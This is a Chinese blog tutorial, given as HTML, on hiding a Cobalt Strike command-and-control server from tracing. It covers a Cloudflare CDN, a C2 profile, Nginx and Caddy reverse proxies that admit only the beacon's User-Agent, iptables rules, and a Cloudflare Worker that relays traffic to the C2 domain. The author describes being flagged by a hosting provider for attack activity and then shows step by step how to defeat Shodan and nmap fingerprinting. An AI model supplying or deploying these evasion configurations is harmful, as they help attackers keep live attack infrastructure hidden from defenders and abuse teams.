class="code"><pre><code class="hljs bash">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore cdn.xxx.club.store -srckeystore cdn.xxx.club.p12 -srcstoretype PKCS12 -srcstorepass 123456 -<span class="hljs-built_in">alias</span> cdn.xxx.club<br></code></pre></td></tr></table></figure><p>​在生成keystore文件后将该文件放在CS的根目录下，务必确保keystore文件名与密码和https-certificate中设置的一致。</p><p>​在一切准备就绪后可以使用CS自带的c2lint对profile语法进行检查，没有报错的话说明配置是ok的。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">./<span class="hljs-keyword">c</span><span class="hljs-number">2</span>lint jquery-<span class="hljs-keyword">c</span><span class="hljs-number">2.4</span>.<span class="hljs-number">3</span>.profile<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117160542580.png" alt="image-20211117160542580"></p><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><h3 id="CDN配置"><a href="#CDN配置" class="headerlink" title="CDN配置"></a>CDN配置</h3><p>Cloudflare默认的TLS配置为灵活，由于之前使用了Cloudflare给原服务器发的证书，我们可以改成完全（严格）提高安全性。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117162107561.png" alt="image-20211117162107561"></p><h3 id="额外配置（坑）"><a href="#额外配置（坑）" class="headerlink" title="额外配置（坑）"></a>额外配置（坑）</h3><p>​其他的Profile我还没测试过，但是应该都是通用的。</p><h4 id="禁用缓存"><a href="#禁用缓存" class="headerlink" title="禁用缓存"></a>禁用缓存</h4><p>​在这个Profile中，我们请求的URI是以.js结尾的，Cloudflare作为一个CDN肯定要去缓存它，但这样的话请求就无法到达我们的CS服务器，自然也就无法上线了。我们可以使用开发模式并清除缓存，但是开发模式只有3小时。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117163757479.png" alt="image-20211117163757479"></p><p>所以推荐的做法是创建Cloudflare规则，不代理js请求。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117163950904.png" alt="image-20211117163950904"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117164005728.png" alt="image-20211117164005728"></p><h4 id="Profile微调"><a href="#Profile微调" class="headerlink" title="Profile微调"></a>Profile微调</h4><p>​据说在4.0版本的CS中，如果不调整Profile是可以上线，但是执行命令没有回显。而在4.3版本的CS中，不动Profile是直接上不了线。<br>我们需要更改Profile中的<strong>响应头</strong>配置，其中的<code>header &quot;Content-Type&quot; &quot;application/javascript; charset=utf-8&quot;;</code>修改为：<code>header &quot;Content-Type&quot; &quot;application/*; charset=utf-8&quot;;</code>即可正常执行命令回显。这里还是CDN的问题，但它具体做了什么让我们上不了线就不知道了。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>启动teamserver，设置profile为我们修改好的profile</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./teamserver your_ip your_pass jquery-c2.4.3.profile<br></code></pre></td></tr></table></figure><p>​在确保域名解析正确的情况下，此时HTTPS BEACON已经可以上线了，我们需要对CS的listener进行配置。填入三次你的域名，其他的默认就好。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117161405595.png" alt="image-20211117161405595"></p><p>生成beacon测试，成功上线：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117161516406.png" alt="image-20211117161516406"></p><h2 id="补充1"><a href="#补充1" class="headerlink" title="补充1"></a>补充1</h2><p>有的师傅443端口是有用处的，需要改成其他的端口。这里需要注意的是免费版的Cloudflare对代理的端口有限制。我们只能成如下端口：</p><ul><li>http：80、8080、8880、2052、2082、2086、2095</li><li>https：443、2053、2083、2087、2096、8443</li></ul><h2 id="补充2"><a href="#补充2" class="headerlink" title="补充2"></a>补充2</h2><p>​以上针对的是https的beacon，http的话在DNS中加一个二级域名并使用该二级域名上线即可。不用额外再弄一个profile，因为http的beacon只看域名。 在http的raw payload中我们可以验证这一点：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117165510460.png" alt="image-20211117165510460"></p><p>对比https的raw payload，它用上了我们之前配置的所有内容：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117165725500.png" alt="image-20211117165725500"></p><h1 id="0x05-高级方案：反向代理（http-x2F-https）与Cloudflare-Workers"><a href="#0x05-高级方案：反向代理（http-x2F-https）与Cloudflare-Workers" class="headerlink" title="0x05 高级方案：反向代理（http&#x2F;https）与Cloudflare Workers"></a>0x05 高级方案：反向代理（http&#x2F;https）与Cloudflare Workers</h1><p>其实原本这一切就已经结束了。但是在我倒腾完的第n天早上收了一个邮件。大意是说我违反了政策，然后让我去主机管理面板看细节。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117171338915.png" alt="image-20211117171338915"></p><p>细节的内容已经找不到了，但大体是说你的服务器与一个攻击行为有关。然后给我丢了一个shodan的链接。我点进去一看，好家伙，给我分析得明明白白，直接扒光了。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117171705824.png" alt="image-20211117171705824"></p><p>我尝试理解了一下发生了什么，发现无法理解。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/8EB9DC8DF847CD3D4A79F69D245DF38D.jpg" alt="img"></p><p>然后查了一下资料，具体就是CS的stage马上线时，默认会向一个符合checksum8规则的路径发起请求，随后服务器会响应各种Payload数据。checksum8规则路径大概就长这样：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/x9cI/</span><br><span class="hljs-regexp">/fYKR/</span><br><span class="hljs-regexp">/Mrm0/</span><br><span class="hljs-regexp">/wQPD/</span><br><span class="hljs-regexp">/yDHX/</span><br><span class="hljs-regexp">/BCre/</span><br><span class="hljs-regexp">/WHVh/</span><br></code></pre></td></tr></table></figure><p>​然后，虽然我们在Profile中配置了URI，但是默认的URI并没有失效。该默认URI依旧可以执行下发任务，上线等一系列操作。我拿nmap脚本跑了一下，发现确实被扒光了。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117174748538.png" alt="image-20211117174748538"></p><p>​解决方案的话也有，一个是用二进制手段对CS源码进行改造。一个是使用反向代理服务器禁用这个checksum8规则路径。由于不会二进制，这里我选择第二种方案。</p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>​反向代理选的套件看了看网上都是清一色的Nginx，不过这回为了兼容某些应用我使用了Caddy。Caddy的好处是配置简单，不像Nginx的配置看起来头大。不过我同样对Nginx进行了测试，最后无论是Nginx还是Caddy都能成功上线。</p><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>可以使用 <a href="https://github.com/threatexpress/cs2modrewrite">https://github.com/threatexpress/cs2modrewrite</a> 提供的脚本生成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 ./cs2nginx.py -i havex.profile -c https://127.0.0.1:8443 -r https://www.baidu.com -H cdn.xxxx.club<br></code></pre></td></tr></table></figure><p>对各个参数进行说明，如下</p><ul><li>-i 为模板文件，这个固定的，可以不用管。</li><li>-c 为后端CS绑定的端口，这个会在后面CS的配置中有所体现</li><li>-r 为不合要求的访问302重定向去的位置，这里填了百度</li><li>-H 为你的域名，这里就是你配的那个</li></ul><p>在配置完后，需要配置ssl证书：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#####################</span><br><span class="hljs-comment"># SSL Configuration</span><br><span class="hljs-comment">#####################</span><br><span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br><span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;<br><span class="hljs-attribute">ssl</span> <span class="hljs-literal">on</span>;<br><br><span class="hljs-attribute">ssl_certificate</span> /root/tool/CS/https/server.pem; <span class="hljs-comment"># 改这个</span><br><span class="hljs-attribute">ssl_certificate_key</span> /root/tool/CS/https/server.key; <span class="hljs-comment"># 改这个</span><br><span class="hljs-attribute">ssl_session_cache</span> shared:le_nginx_SSL:<span class="hljs-number">1m</span>; <span class="hljs-comment"># managed by Certbot</span><br><span class="hljs-attribute">ssl_session_timeout</span> <span class="hljs-number">1440m</span>; <span class="hljs-comment"># managed by Certbot</span><br><span class="hljs-attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>; <span class="hljs-comment"># managed by Certbot</span><br><span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>; <span class="hljs-comment"># managed by Certbot</span><br></code></pre></td></tr></table></figure><p>​同时的话还可以定制化处理location块，使得只有指定URL才能访问，保证了不会被扫到。指定User-Agent可以确保的都是Beacon而不是其他的奇怪的东西，有点白名单的意思了。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> <span class="hljs-regexp">~ ^(/jquery-3\.3\.1\.slim\.min\.js|/jquery-3\.3\.2\.min\.js|/jquery-3\.3\.1\.min\.js|/jquery-3\.3\.2\.slim\.min\.js)$</span> &#123;<br>        <span class="hljs-attribute">if</span> (<span class="hljs-variable">$http_user_agent</span> != <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;</span>) &#123;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">302</span> <span class="hljs-variable">$REDIRECT_DOMAIN</span><span class="hljs-variable">$request_uri</span>;<br>        &#125;<br>        <span class="hljs-attribute">proxy_pass</span>          <span class="hljs-variable">$C2_SERVER</span>;<br><br>        <span class="hljs-comment"># If you want to pass the C2 server&#x27;s &quot;Server&quot; header through then uncomment this line</span><br>        <span class="hljs-comment"># proxy_pass_header Server;</span><br>        <span class="hljs-attribute">expires</span>             <span class="hljs-literal">off</span>;<br>        <span class="hljs-attribute">proxy_redirect</span>      <span class="hljs-literal">off</span>;<br>        <span class="hljs-attribute">proxy_set_header</span>    Host                <span class="hljs-variable">$host</span>;<br>        <span class="hljs-attribute">proxy_set_header</span>    X-Forwarded-For     <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>        <span class="hljs-attribute">proxy_set_header</span>    X-Real-IP           <span class="hljs-variable">$remote_addr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里还要注意的是这里的Nginx宜以root权限运行，默认生成的文件是www-data用户。使用该用户<strong>可能</strong>会有权限问题，这也是大多数人使用反向代理后https无法上线的原因。当然最重要的还是要学会看Nginx错误日志，至少能定位到问题在哪：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117201414251.png" alt="image-20211117201414251"></p><p>​当时我是报了一个<code>(13: Permission denied) while reading upstream</code>的错误，改成root运行Nginx后就好了，但现在重新用回www-data后也不报错了。。 推测是某些临时文件的属主变了吧。</p><p>​该配置经过测试能够成功上线，CS配置如下。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117204625059.png" alt="image-20211117204625059"></p><h3 id="Caddy"><a href="#Caddy" class="headerlink" title="Caddy"></a>Caddy</h3><p>caddy的配置就简单的多，这里直接贴配置文件。没有Caddy可以装一个：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> caddy<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>caddy/Caddyfile<br></code></pre></td></tr></table></figure><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs groovy">cdn.xxxx.club &#123;<br>        tls <span class="hljs-regexp">/root/</span>tool<span class="hljs-regexp">/CS/</span>https<span class="hljs-regexp">/server.pem /</span>root<span class="hljs-regexp">/tool/</span>CS<span class="hljs-regexp">/https/</span>server.key<br>        reverse_proxy <span class="hljs-regexp">/jquery-3.3* https:/</span>/<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8443</span> &#123;<br>               transport http &#123;<br>                        tls<br>                        tls_insecure_skip_verify<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里说明一下各个主要指令的作用：</p><ul><li>最外面的tls：启用tls连接，这里的tls连接是指下游连接，即和Cloudflare的CDN服务器的连接。证书和秘钥是Cloudflare给的那个。</li><li>reverse_proxy：反向代理。</li><li>里面的tls：同样是使用tls连接。</li><li>tls_insecure_skip_verify：我们使用的生成keystore的证书同样是Cloudflare签发的那个，这里的tls连接是Caddy和CS服务器的连接，由于Cloudflare签发的证书是不受（除Cloudflare以外的机构）信任的，亦即该证书在Caddy看来是不受信任的，连接是不安全的。我们需要加上tls_insecure_skip_verify指定，否则Caddy将在握手阶段就终止该https连接。并报不受信任的证书错误。</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2021</span>/<span class="hljs-number">11</span>/<span class="hljs-number">16</span> <span class="hljs-number">12</span>:<span class="hljs-number">09</span>:<span class="hljs-number">01</span>.<span class="hljs-number">975</span> ERROR   http.log.error  x509: cannot validate certificate for <span class="hljs-number">127.0.0.1</span> because it doesn&#x27;t contain any IP SANs<br></code></pre></td></tr></table></figure><p>​该配置经过测试能够成功上线。CS配置和nginx中所提到的相同</p><h3 id="配置Iptables"><a href="#配置Iptables" class="headerlink" title="配置Iptables"></a>配置Iptables</h3><p>我们的listener监听的是0.0.0.0，我们应该配置成只能让反向代理套件访问。否则像shodan这样的搜索引擎或者我们自己拿nmap脚本去扫端口的话依旧能够分析出beacon信息。可以使用如下命令配置iptables，要是云厂商提供防火墙的话也可以在那边的防火墙进行配置。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -s <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">8443</span> -j ACCEPT<br>iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">8443</span> -j DROP<br><br>iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -s <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">8880</span> -j ACCEPT<br>iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">8880</span> -j DROP<br></code></pre></td></tr></table></figure><p>现在再拿脚本进行测试的话，就发现扫不出任何东西了：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117205132545.png" alt="image-20211117205132545"></p><h2 id="Cloudflare-Workers"><a href="#Cloudflare-Workers" class="headerlink" title="Cloudflare Workers"></a>Cloudflare Workers</h2><p>这个有点类似域前置，但是有域前置还是用域前置的好。使用Cloudflare Workers可以隐藏我们的真实域名。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117205312256.png" alt="image-20211117205312256"></p><p>申请好子域后创建服务：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117205428095.png" alt="image-20211117205428095"></p><p>创建好服务后点击快速编辑：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117205533744.png" alt="image-20211117205533744"></p><p>并粘贴如下脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> upstream = <span class="hljs-string">&#x27;https://cdn.xxxx.club&#x27;</span> # 这里写你的域名<br><br><span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>    event.<span class="hljs-title function_">respondWith</span>(<span class="hljs-title function_">fetchAndApply</span>(event.<span class="hljs-property">request</span>));<br>&#125;)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchAndApply</span>(<span class="hljs-params">request</span>) &#123;<br>    <span class="hljs-keyword">const</span> ipAddress = request.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;cf-connecting-ip&#x27;</span>) || <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">let</span> requestURL = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(request.<span class="hljs-property">url</span>);<br>    <span class="hljs-keyword">let</span> upstreamURL = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(upstream);<br>    requestURL.<span class="hljs-property">protocol</span> = upstreamURL.<span class="hljs-property">protocol</span>;<br>    requestURL.<span class="hljs-property">host</span> = upstreamURL.<span class="hljs-property">host</span>;<br>    requestURL.<span class="hljs-property">pathname</span> = upstreamURL.<span class="hljs-property">pathname</span> + requestURL.<span class="hljs-property">pathname</span>;<br><br>    <span class="hljs-keyword">let</span> new_request_headers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Headers</span>(request.<span class="hljs-property">headers</span>);<br>    new_request_headers.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>, ipAddress);<br>    <span class="hljs-keyword">let</span> fetchedResponse = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>(requestURL, &#123;<br>            <span class="hljs-attr">method</span>: request.<span class="hljs-property">method</span>,<br>            <span class="hljs-attr">headers</span>: new_request_headers,<br>            <span class="hljs-attr">body</span>: request.<span class="hljs-property">body</span><br>        &#125;)<br>    );<br>    <span class="hljs-keyword">let</span> modifiedResponseHeaders = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Headers</span>(fetchedResponse.<span class="hljs-property">headers</span>);<br>    modifiedResponseHeaders.<span class="hljs-title function_">delete</span>(<span class="hljs-string">&#x27;set-cookie&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<br>        fetchedResponse.<span class="hljs-property">body</span>,<br>        &#123;<br>            <span class="hljs-attr">headers</span>: modifiedResponseHeaders,<br>            <span class="hljs-attr">status</span>: fetchedResponse.<span class="hljs-property">status</span>,<br>            <span class="hljs-attr">statusText</span>: fetchedResponse.<span class="hljs-property">statusText</span><br>        &#125;<br>    );<br>&#125;<br><br></code></pre></td></tr></table></figure><p>之后使用右侧的域名替换CS中https beacon的三个域名即可：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117205733591.png" alt="image-20211117205733591"></p><p>​经过测试能够成功上线。</p><h1 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h1><p>参考文献：</p><p><a href="https://myzxcg.com/2020/12/Cobalt-Strike%E5%8E%BB%E7%89%B9%E5%BE%81%E9%85%8D%E7%BD%AENginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86CDN%E4%B8%8ECloudflare-Worker/">https://myzxcg.com/2020/12/Cobalt-Strike%E5%8E%BB%E7%89%B9%E5%BE%81%E9%85%8D%E7%BD%AENginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86CDN%E4%B8%8ECloudflare-Worker/</a></p><p><a 